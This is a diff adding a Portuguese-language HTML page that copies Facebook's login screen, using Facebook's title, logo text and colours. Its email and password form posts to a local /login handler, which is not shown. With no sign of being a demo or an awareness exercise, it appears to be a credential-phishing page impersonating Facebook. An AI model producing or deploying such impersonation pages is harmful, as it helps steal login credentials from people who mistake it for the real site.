@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – entre ou cadastre-se</title>
+    <style>
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-container { width: 396px; text-align: center; }
+        .login-box { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1); }
+        input { width: 92%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; }
+        button { width: 100%; padding: 14px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 20px; font-weight: bold; cursor: pointer; }
+        .fb-logo { color: #1877f2; font-size: 60px; font-weight: bold; margin-bottom: 20px; }
+        .footer-link { margin-top: 20px; color: #1877f2; text-decoration: none; font-size: 14px; display: block; }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="fb-logo">facebook</div>
+        <div class="login-box">
+            <form action="/login" method="POST">
+                <input type="text" name="email" placeholder="Email ou telefone" required>
+                <input type="password" name="password" placeholder="Senha" required>
+                <button type="submit">Entrar</button>
+            </form>
+            <a href="#" class="footer-link">Esqueceu a senha?</a>
+            <hr style="margin: 20px 0; border: 0.5px solid #dadde1;">
+            <button style="background-color: #42b72a; width: auto; padding: 10px 16px; font-size: 17px;">Criar nova conta</button>
+        </div>
+    </div>
+</body>
+</html>
